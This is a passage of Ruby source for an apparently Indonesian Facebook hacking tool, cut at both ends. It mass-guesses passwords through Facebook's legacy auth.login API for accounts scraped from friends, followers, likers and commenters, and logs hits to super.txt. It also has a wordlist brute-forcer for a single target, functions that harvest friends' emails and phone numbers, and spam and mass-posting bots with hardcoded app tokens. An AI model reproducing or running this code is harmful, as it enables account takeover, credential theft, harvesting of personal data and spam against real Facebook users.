    puts ("\033[97m[+] CRACK!")
    pool = Thread.pool($MaxProcess)
    puts ("\033[97m═"*52)
    id.map {|i| pool.process{main(i)}}
    pool.shutdown
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Total OK : "+$ok.to_s)
    puts ("\033[93m[!] Total CP : "+$cp.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Super()
  elsif su == '2' or su == '02'
    system ('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    puts ("\033[97m[+] Pleace Wait.....")
    a = get("https://graph.facebook.com/me/subscribers?limit=#{$limits}&access_token=#{$token}")
    b = JSON.parse(a)
    kosong = b['data'].empty?
    if kosong
      puts ("\033[93m[+] Your Account Has No Followers")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    else
      puts ("\033[97m[+] Total Id : #{b['summary']['total_count']}")
      puts ("\033[93m[!] You will only be cracking #{$limits} account") if b['summary']['total_count'] > $limits
      puts ("\033[97m[+] CRACK!")
      id = b['data'].map {|i| i['id']}
      pool = Thread.pool($MaxProcess)
      puts ("\033[97m═"*52)
      id.map {|i| pool.process{main(i)}}
      pool.shutdown
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Total OK : "+$ok.to_s)
      puts ("\033[93m[!] Total CP : "+$cp.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    end
   elsif su == '3' or su == '03'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Post Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    a = get("https://graph.facebook.com/#{id}?access_token=#{$token}")
    b = JSON.parse(a)
    if b.key? ('error')
      puts ("\033[97m[+] Posts Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    else
      puts ("\033[97m[+] Posted by #{b['from']['name']}")
      if b.key? ('likes')
        a = get("https://graph.facebook.com/#{id}/likes?summary=true&limit=#{$limits}&access_token=#{$token}")
        b = JSON.parse(a)
        id = b['data'].map {|i| i['id']}
        puts ("\033[97m[+] Total Like #{b['summary']['total_count']}")
        puts ("\033[93m[!] You will only be cracking #{id.length} account") if id.length != b['summary']['total_count']
        puts ("\033[97m[+] CRACK!")
        pool = Thread.pool($MaxProcess)
        puts ("\033[97m═"*52)
        id.map {|i| pool.process{main(i)}}
        pool.shutdown
        puts ("\033[97m═"*52)
        puts ("\033[92m[✓] Total OK : "+$ok.to_s)
        puts ("\033[93m[!] Total CP : "+$cp.to_s)
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      else
        puts ("\033[93m[+] No Like")
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      end
    end
  elsif su == '4' or su == '04'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Post Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    a = get("https://graph.facebook.com/#{id}?access_token=#{$token}")
    b = JSON.parse(a)
    if b.key? ('error')
      puts ("\033[97m[+] Posts Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    else
      puts ("\033[97m[+] Posted by #{b['from']['name']}")
      if b.key? ('comments')
        a = get("https://graph.facebook.com/#{id}/comments?summary=true&limit=#{$limits}&access_token=#{$token}")
        b = JSON.parse(a)
        id = b['data'].map {|i| i['id']}
        id = id.uniq
        puts ("\033[97m[+] Total Id #{id.length}")
        puts ("\033[97m[+] CRACK!")
        pool = Thread.pool($MaxProcess)
        puts ("\033[97m═"*52)
        id.map {|i| pool.process{main(i)}}
        pool.shutdown
        puts ("\033[97m═"*52)
        puts ("\033[92m[✓] Total OK : "+$ok.to_s)
        puts ("\033[93m[!] Total CP : "+$cp.to_s)
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      else
        puts ("\033[93m[+] No Comment")
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      end
    end
  elsif su == '5' or su == '05'
    begin
      system ('clear')
      puts ($logo)
      puts ("\033[97m═"*52)
      print ("\033[97m[+] Friend Id : ")
      temen = gets.chomp()
      x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
      y = JSON.parse(x)
      puts ("\033[97m[+] Crack From: "+y['name'])
      a = get('https://graph.facebook.com/' + temen + '/friends?access_token=' + $token)
      b = JSON.parse(a)
      id = b['data'].map {|i| i['id']}
      tik ("\033[97m[+] Total Id  : "+id.length().to_s)
      puts ("\033[97m[!] CRACK!")
      pool = Thread.pool($MaxProcess)
      puts ("\033[97m═"*52)
      id.map {|i| pool.process{main(i)}}
      pool.shutdown
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Total OK : "+$ok.to_s)
      puts ("\033[93m[!] Total CP : "+$cp.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    rescue TypeError
      puts("\033[93m[!] Users Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Hamker()
    end
  elsif su == '6' or su == '06'
    begin
      system ('clear')
      puts ($logo)
      puts ("\033[97m═"*52)
      print ("\033[97m[+] Friend id : ")
      id = gets.chomp()
      #puts ("\033[97m[+] Pleace Wait.....")
      a = get("https://graph.facebook.com/#{id}?fields=name,subscribers.limit(#{$limits}).summary(true)&access_token=#{$token}")
      b = JSON.parse(a)
      kosong = b['subscribers']['data'].empty?
      if kosong
        puts ("\033[93m[+] Account Has No Followers")
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      else
        id = b['subscribers']['data'].map {|i| i['id']}
        puts ("\033[97m[+] Crack From #{b['name']}")
        puts ("\033[97m[+] Total Followers #{b['subscribers']['summary']['total_count']}")
        puts ("\033[93m[!] You will only be cracking #{id.length} account") if b['subscribers']['summary']['total_count'] > id.length
        puts ("\033[97m[+] CRACK!")
        pool = Thread.pool($MaxProcess)
        puts ("\033[97m═"*52)
        id.map {|i| pool.process{main(i)}}
        pool.shutdown
        puts ("\033[97m═"*52)
        puts ("\033[92m[✓] Total OK : "+$ok.to_s)
        puts ("\033[93m[!] Total CP : "+$cp.to_s)
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      end
    rescue NoMethodError
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    end
  elsif su == '0' or su == '00'
    Hamker()
  else
    tik ("\033[93m[!] Invalid Input")
    sleep(0.9)
    Super()
  end
end

def main(id)
  File.open("super.txt","a") do |data|
    lanjut = true ; lanjut = false if id == $id
    pw1 = ["Sayang","Anjing","Bangsat","Kontol","Doraemon"]
    for pwd in pw1
      break if id == $id
      req = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      parse = JSON.parse(req)
      if parse.include? ("access_token")
        $ok += 1
        data << "#{id} |  #{pwd}\n"
        puts ("\033[92m[OK] #{id} | #{pwd}")
        lanjut = false
        break
      elsif parse.include? ('error_msg') and parse['error_msg'].include?  ('www.facebook.com')
        $cp += 1
        data << "#{id} | #{pwd}\n"
        puts ("\033[93m[CP] #{id} | #{pwd}")
        lanjut = false
        break
      end
    end
    if lanjut
      a = get("https://graph.facebook.com/#{id}/?access_token=#{$token}")
      b = JSON.parse(a)
      name = ERB::Util.url_encode(b['name'])
      first = ERB::Util.url_encode(b['first_name'])
      last = ERB::Util.url_encode(b['last_name'])
      pw2 = [name + '123',name + '12345',first + '123',first + '12345',last + '123',last + '12345']
      for pwd in pw2
        params = {'access_token'=> '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','format'=> 'JSON','sdk_version'=> '2','email'=> id,'locale'=> 'en_US','password'=> pwd,'sdk'=> 'ios','generate_session_cookies'=> '1','sig'=> '3f555f99fb61fcd7aa0c44f58f522ef6'}
        uri = URI("https://b-api.facebook.com/method/auth.login")
        uri.query = URI.encode_www_form(params)
        res = Net::HTTP.get_response(uri)
        parse = JSON.parse(res.body)
        if parse.include? ('access_token')
          $ok += 1
          data << "#{id} |  #{pwd}\n"
          puts ("\033[92m[OK] #{id} | #{pwd}")
          break
        elsif parse.include? ('error_msg') and parse['error_msg'].include?  ('www.facebook.com')
          $cp += 1
          data << "#{id} | #{pwd}\n"
          puts ("\033[93m[CP] #{id} | #{pwd}")
          break
        end
      end
    end
  end
end



def Brutal()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[91m[+] \033[92mId\033[97m/\033[92memail\033[97m/\033[92mPhone \033[97m(\033[92mTarget\033[97m) \033[91m:")
  target = gets.chomp()
  print ("\033[91m[+] \033[92mWordlist \033[97mext(list.txt) \033[91m: ")
  file = gets.chomp()
  if File.file? (file)
    password = File.readlines(file, chomp: true)
    puts ("\033[91m[\033[96m✓\033[91m] \033[92mTarget \033[91m: \033[97m" + target)
    puts ("\033[91m[+] \033[92mTotal \033[96m" + password.length.to_s + " \033[92mPassword ")
    puts ("\033[97m═"*52)
    for pw in password
      begin
        puts ("\033[91m[+] \033[92mLogin As \033[91m: \033[97m-> \033[92m%s \033[97m-> \033[92m%s" % [target, pw])
        a = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        b = JSON.parse(a)
        if b.include? ('access_token')
          puts ("\033[97m═"*52)
          puts ("\033[92m[✓] Success")
          puts ("\033[92m[✓] username : "+target)
          puts ("\033[92m[✓] password : "+pw)
          abort ("\033[91m[!] exit")
        elsif b.include? ('error_msg') and b['error_msg'].include?  ('www.facebook.com')
          puts ("\033[97m═"*52)
          puts ("\033[93m[!] Account Has Been Checkpoint")
          puts ("\033[92m[✓] username : "+target)
          puts ("\033[92m[✓] password : "+pw)
          abort ("\033[91m[!] exit")
        end
      rescue SocketError
        puts ("\033[91m[!] No Connection")
        sleep(0.5)
      rescue Errno::ETIMEDOUT
        puts ("\033[93m[!] Connection timed out")
        sleep(0.5)
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[91m[!] Sorry, opening password target failed :(")
    puts ("\033[91m[!] Try other method.")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Hamker()
  else
    puts ("\033[93m[!] File Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Hamker()
  end
end
 
def GetMenu()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("║-> \033[97m1. Get ID From Friends")
  puts ("║-> \033[97m2. Get Friends ID From Friends")
  puts ("║-> \033[97m3. Get Friends Email")
  puts ("║-> \033[97m4. Get Friends Email From Friends")
  puts ("║-> \033[97m5. Get Phone From Friends")
  puts ("║-> \033[97m6. Get Friend\s Phone From Friends")
  puts ("║-> \033[97m0. Back")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  top = gets.chomp()
  if top == '1' or top == '01'
    IdTemen()
  elsif top == '2' or top == '02'
    IdDariTemen()
  elsif top == '3' or top == '03'
    EmailTemen()
  elsif top == '4' or top == '04'
    EmailDariTemen()
  elsif top == '5' or top == '05'
    HpTemen()
  elsif top == '6' or top == '06'
    HpDariTemen()
  elsif top == '0' or top == '00'
    Hamker()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(1.5)
    GetMenu()
  end
end


def IdTemen()
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  x = get('https://graph.facebook.com/me/friends?access_token=' + $token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  print ("\033[97m[+] Save File (file.txt) : ")
  file = gets.chomp()
  file = "id.txt" if file == "" or file[0] == " "
  buka = File.open(file,"a")
  puts ("\033[97m═"*52)
  for i in y['data']
    buka.write(i["id"] + "\n")
    total += 1
    puts ("\033[92m[✓] Name : "+i['name'])
    puts ("\033[92m[✓] Id.  : "+i['id'])
    puts ("\033[97m═"*52)
  end
  buka.close()
  puts ("\033[92m[✓] Total Id : "+total.to_s)
  puts ("\033[92m[✓] File : "+File.basename(file))
  puts ("\033[92m[✓] File Path "+File.realpath(file))
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  GetMenu()
end


def IdDariTemen()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    temen = gets.chomp()
    x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
    y = JSON.parse(x)
    if y.include? ('error') and y['error']['code']
      abort ("\033[91m[!] "+y['error']['message'])
    elsif y.include? ('error')
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    else
      tik("\033[97m[+] From "+y['name'])
      x = get('https://graph.facebook.com/' + temen + '?fields=friends.limit(5000)&access_token=' + $token)
      y = JSON.parse(x)
      print ("\033[97m[+] Save File (file.txt) : ")
      file = gets.chomp()
      file = "Friend-Id.txt" if file == "" or file[0] == " "
      buka = File.open(file,"a")
      puts ("\033[97m═"*52)
      for i in y['friends']['data']
        buka.write(i["id"] + "\n")
        total += 1
        puts ("\033[92m[✓] Name : "+i['name'])
        puts ("\033[92m[✓] Id.  : "+i['id'])
        puts ("\033[97m═"*52)
      end
      buka.close()
      puts ("\033[92m[✓] Total Id : "+total.to_s)
      puts ("\033[92m[✓] File : "+File.basename(file))
      puts ("\033[92m[✓] File Path "+File.realpath(file))
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    GetMenu()
  end
end

def EmailTemen()
  total = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  x = get('https://graph.facebook.com/me/friends?access_token='+$token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  print ("\033[97m[+] Save File (file.txt) : ")
  file = gets.chomp()
  file = "email.txt" if file == "" or file[0] == " "
  buka = File.open(file,"a")
  puts ("\033[97m═"*52)
  for i in y['data']
    a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
    b = JSON.parse(a)
    if b.include? ('email')
      buka.write(b['email'] + "\n")
      total += 1
      puts ("\033[92m[✓] Name : "+i['name'])
      puts ("\033[92m[✓] email: "+b['email'])
      puts ("\033[97m═"*52)
    end
  end
  buka.close()
  puts ("\033[92m[✓] Total email : "+total.to_s)
  puts ("\033[92m[✓] File : "+File.basename(file))
  puts ("\033[92m[✓] File Path "+File.realpath(file))
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  GetMenu()
end

def EmailDariTemen()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    temen = gets.chomp()
    x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
    y = JSON.parse(x)
    if y.include? ('error') and y['error']['code']
      abort ("\033[91m[!] Invalid Access Token")
    elsif y.include? ('error')
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    else
      tik("\033[97m[+] From "+y['name'])
      x = get('https://graph.facebook.com/' + temen + '?fields=friends.limit(5000)&access_token=' + $token)
      y = JSON.parse(x)
      print ("\033[97m[+] Save File (file.txt) : ")
      file = gets.chomp()
      file = "Friend-email.txt" if file == "" or file[0] == " "
      buka = File.open(file,"a")
      puts ("\033[97m═"*52)
      for i in y['friends']['data']
        a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
        b = JSON.parse(a)
        if b.include? ('email')
          buka.write(b['email'] + "\n")
          total += 1
          puts ("\033[92m[✓] Name : "+i['name'])
          puts ("\033[92m[✓] email: "+b['email'])
          puts ("\033[97m═"*52)
        end
      end
      buka.close()
      puts ("\033[92m[✓] Total email : "+total.to_s)
      puts ("\033[92m[✓] File : "+File.basename(file))
      puts ("\033[92m[✓] File Path "+File.realpath(file))
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    GetMenu()
  end
end

def HpTemen()
  total = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  x = get('https://graph.facebook.com/me/friends?access_token='+$token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  print ("\033[97m[+] Save File (file.txt) : ")
  file = gets.chomp()
  file = "MobilePhone.txt" if file == "" or file[0] == " "
  buka = File.open(file,"a")
  puts ("\033[97m═"*52)
  for i in y['data']
    a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
    b = JSON.parse(a)
    if b.include? ('mobile_phone')
      buka.write(b['mobile_phone'] + "\n")
      total += 1
      puts ("\033[92m[✓] Name : "+i['name'])
      puts ("\033[92m[✓] phone: "+b['mobile_phone'])
      puts ("\033[97m═"*52)
    end
  end
  buka.close()
  puts ("\033[92m[✓] Total phone : "+total.to_s)
  puts ("\033[92m[✓] File : "+File.basename(file))
  puts ("\033[92m[✓] File Path "+File.realpath(file))
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  GetMenu()
end

def HpDariTemen()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    temen = gets.chomp()
    x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
    y = JSON.parse(x)
    if y.include? ('error') and y['error']['code']
      abort ("\033[91m[!] Invalid Access Token")
    elsif y.include? ('error')
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    else
      tik("\033[97m[+] From "+y['name'])
      x = get('https://graph.facebook.com/' + temen + '?fields=friends.limit(5000)&access_token=' + $token)
      y = JSON.parse(x)
      print ("\033[97m[+] Save File (file.txt) : ")
      file = gets.chomp()
      file = "Friend-phone.txt" if file == "" or file[0] == " "
      buka = File.open(file,"a")
      puts ("\033[97m═"*52)
      for i in y['friends']['data']
        a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
        b = JSON.parse(a)
        if b.include? ('mobile_phone')
          buka.write(b['mobile_phone'] + "\n")
          total += 1
          puts ("\033[92m[✓] Name : "+i['name'])
          puts ("\033[92m[✓] phone: "+b['mobile_phone'])
          puts ("\033[97m═"*52)
        end
      end
      buka.close()
      puts ("\033[92m[✓] Total phone: "+total.to_s)
      puts ("\033[92m[✓] File : "+File.basename(file))
      puts ("\033[92m[✓] File Path "+File.realpath(file))
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    GetMenu()
  end
end
   
def Bot()
  system("clear")
  puts ($logo)
  puts ("Welcome To Bot Menu :)")
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Post Reaction")
  puts ("\033[97m║-> \x1b[1;37;40m2. Post comments")
  puts ("\033[97m║-> \x1b[1;37;40m3. Add Friend")
  puts ("\033[97m║-> \x1b[1;37;40m4. Follow")
  puts ("\033[97m║-> \x1b[1;37;40m5. Share Post")
  puts ("\033[97m║-> \x1b[1;37;40m6. Delete Post")
  puts ("\033[97m║-> \x1b[1;37;40m7. Unfriends")
  puts ("\033[97m║-> \x1b[1;37;40m8. Unfollow")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  bots = gets.chomp()
  if bots == '1' or bots == '01'
    ReactPostMenu()
  elsif bots == '2' or bots == '02'
    CommentPostMenu()
  elsif bots == '3' or bots == '03'
    AddFriendMenu()
  elsif bots == '4' or bots == '04'
    FollowMenu()
  elsif bots == '5' or bots == '05'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Post Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    req = get("https://graph.facebook.com/#{id}?fields=from,id&access_token=#{$token}")
    res = JSON.parse(req)
    if not res.key? ('id')
      puts ("\033[93m[+] Posts Not Found")
    else
      SharePostMenu(link = "https://www.facebook.com/#{res['id']}")
    end
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Bot()
  elsif bots == '6' or bots == '06'
    DeleteAllPost()
  elsif bots == '7' or bots == '07'
    Unfriend()
  elsif bots == '8' or bots == '08'
    unfollow()
  elsif bots == '0' or bots == '00'
    menu()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    Bot()
  end
end

def ReactPostMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Target Post Reaction")
  puts ("\033[97m║-> \x1b[1;37;40m2. Group Post Reactions")
  puts ("\033[97m║-> \x1b[1;37;40m3. Random Target Post Reaction")
  puts ("\033[97m║-> \x1b[1;37;40m4. Random Group Post Reaction")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    ReactPost()
  elsif mana == '2' or mana == '02'
    ReactGruop()
  elsif mana == '3' or mana == '03'
    ReactPostRandom()
  elsif mana == '4' or mana == '04'
    ReactGruopRandom()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    ReactPostMenu()
  end
end

def CommentPostMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Comment Target Post")
  puts ("\033[97m║-> \x1b[1;37;40m2. Comment Group Post")
  puts ("\033[97m║-> \x1b[1;37;40m3. Spam Comment")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    CommentPost()
  elsif mana == '2' or mana == '02'
    CommentGroup()
  elsif mana == '3' or mana == '03'
    SpamComment()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    CommentPostMenu()
  end
end

def AddFriendMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Add Friend From Target Id")
  puts ("\033[97m║-> \x1b[1;37;40m2. Add Friend From Friend")
  puts ("\033[97m║-> \x1b[1;37;40m3. Add Friend From File Id")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    AddTarget()
  elsif mana == '2' or mana == '02'
   AddFriends()
  elsif mana == '3' or mana == '03'
   AddFile()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    AddFriendMenu()
  end
end

def FollowMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Follow target Id")
  puts ("\033[97m║-> \x1b[1;37;40m2. Follow all friend")
  puts ("\033[97m║-> \x1b[1;37;40m3. Follow Friend from Friend")
  puts ("\033[97m║-> \x1b[1;37;40m4. Follow From File Id")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    FolowTarget()
  elsif mana == '2' or mana == '02'
   FolowAll()
  elsif mana == '3' or mana == '03'
   FolowFromFriend()
  elsif mana == '4' or mana == '04'
    FolowFromFile()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    FollowMenu()
  end
end

def SharePostMenu(link)
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Share To Facebook")
  puts ("\033[97m║-> \x1b[1;37;40m2. Share on a Friend's Timeline")
  puts ("\033[97m║-> \x1b[1;37;40m3. Share on a Page")
  puts ("\033[97m║-> \x1b[1;37;40m4. Share in WhatsApp")
  #puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    system('clear')
    puts ($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Message : ")
    msg = gets.chomp()
    msg = msg.tr("<>","\n")
    req = get("https://graph.facebook.com/me/feed?method=POST&link=#{link}&message=#{msg}&access_token=#{$token}")
    res = JSON.parse(req)
    if res.key? ('id')
      puts ("\033[92m[✓] Success : #{res['id']}")
    else
      puts ("\033[93m[!] Failed  : nil")
    end
  elsif mana == '2' or mana == '02'
    system('clear')
    puts ($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Message : ")
    msg = gets.chomp()
    msg = msg.tr("<>","\n")
    print ("\033[97m[+] Limit (\033[92mMax \033[91m#{$limits}\033[97m) : ")
    limit = gets.to_i
    a = get("https://graph.facebook.com/me/friends?fields=id,name&limit=#{limit}&access_token=#{$token}")
    b = JSON.parse(a)
    if not b.key? ("data")
      abort ("\033[91m[!] Error")
    elsif b['data'].empty?
      puts ("\033[93m[+] Your Account Has No Friends")
    else
      puts ("\033[97m[+] CTRL + C TO STOP")
      puts ("\033[97m[+] Pleace Wait...")
      puts ("\033[97m═"*52)
      for i in b['data']
        begin
          nama = i['name']
          id = i['id']
          req = get("https://graph.facebook.com/#{id}/feed?method=POST&link=#{link}&message=#{msg}&access_token=#{$token}")
          res = JSON.parse(req)
          if res.key? ("id")
            total += 1
            puts ("\033[92m[✓] Success : #{nama} --> #{id}")
          else
            puts ("\033[93m[!] Failed  : #{nama} --> #{id}")
          end
          sleep(0.2)
        rescue SocketError
          puts ("\033[91m[!] No Connection")
          sleep(0.9)
        rescue Interrupt
          puts ("\n") ; break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish #{total}")
    end
  elsif mana == '3' or mana == '03'
    system('clear')
    puts($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Message : ")
    msg = gets.chomp()
    msg = msg.tr("<>","\n")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=name,access_token&limit=#{limit}&access_token="+$token)
    b = JSON.parse(a)
    if not b.key? ("data")
      abort ("\033[91m[!] Error")
    elsif b['data'].empty?
      puts ("\033[93m[+] Your Account Doesn't Have a Page")
    else
      puts ("\033[97m[+] CTRL + C TO STOP")
      puts ("\033[97m[+] Pleace Wait...")
      puts ("\033[97m═"*52)
      for i in b['data']
        begin
          nama = i['name']
          id = i['id']
          token = i['access_token']
          req = get("https://graph.facebook.com/#{id}/feed?method=POST&link=#{link}&message=#{msg}&access_token=#{token}")
          res = JSON.parse(req)
          if res.key? ("id")
            total += 1
            puts ("\033[92m[✓] Success : #{nama} --> #{id}")
          else
            puts ("\033[93m[!] Failed  : #{nama} --> #{id}")
          end
          sleep(0.2)
        rescue SocketError
          puts ("\033[91m[!] No Connection")
          sleep(0.9)
        rescue Interrupt
          puts ("\n") ; break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish #{total}")
    end
  elsif mana == '4' or mana == '04'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    sukses = system("xdg-open --chooser whatsapp://send?text=#{link}")
    if sukses
      puts ("\033[92m[✓] Successfully Opening the WhatsApp Application")
    else
      puts ("\033[93m[+] Failed to Open the WhatsApp Application")
    end
  else
    puts ("\033[93m[+] Invalid Input")
  end
end

def React()
  loop do
    system("clear")
    puts ($logo)
    puts ("\033[97m═"*52)
    puts ("\033[97m║-> \x1b[1;34;40m1. LIKE")
    puts ("\033[97m║-> \x1b[1;35;40m2. LOVE")
    puts ("\033[97m║-> \x1b[1;33;40m3. HAHA")
    puts ("\033[97m║-> \x1b[1;33;40m4. WOW")
    puts ("\033[97m║-> \x1b[1;36;40m5. SAD")
    puts ("\033[97m║-> \x1b[1;31;40m6. ANGRY")
    puts ("\x1b[1;37;40m║")
    print ("╚═\x1b[1;91m▶\x1b[1;97m ")
    pilih = gets.chomp()
    if pilih == '1' or pilih == '01'
      return 'LIKE'
    elsif pilih == '2' or pilih == '02'
      return 'LOVE'
    elsif pilih == '3' or pilih == '03'
      return 'HAHA'
    elsif pilih == '4' or pilih == '04'
      return 'WOW'
    elsif pilih == '5' or pilih == '05'
      return 'SAD'
    elsif pilih == '6' or pilih == '06'
      return 'ANGRY'
    else
      puts ("\033[93m[!] Invalid Input")
      sleep(1)
    end
  end
end


def ReactPost()
  begin
    total = 0
    tipe = React()
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Target Id : ")
